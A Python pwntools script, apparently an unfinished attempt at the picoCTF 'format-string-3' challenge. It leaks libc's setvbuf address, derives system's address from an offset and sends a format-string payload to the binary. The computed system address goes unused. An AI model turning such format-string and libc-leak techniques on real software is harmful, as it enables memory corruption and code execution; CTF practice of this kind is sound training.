#! /usr/bin/python3

from pwn import *

# Start the process
p = process('./format-string-3')  
#p = remote('rhea.picoctf.net',53404)

# Read the output from the binary until we reach the setvbuf address
output = p.recvuntil(b"Here's the address of setvbuf in libc: ")
setvbuf_addr_str = p.recvline().strip()  # This should give us the address as a string
setvbuf_addr = int(setvbuf_addr_str, 16)  # Convert the string to an integer (hexadecimal)

# Print the address for confirmation
log.info(f"Leaked setvbuf address: {hex(setvbuf_addr)}")

# Calculate the address of system using the offset
offset = 175248  # setvbuf - system
system_addr = setvbuf_addr - offset
log.info(f"Calculated system address: {hex(system_addr)}")

# Address of normal_string
normal_string_addr = 0x404048

# Start of user input is at 38th position on the stack
stack_position = 38

# Send the payload
payload = b'%39$lxA,'+p64(normal_string_addr)
p.sendline(payload)

# Drop to interactive shell to check results
p.interactive()
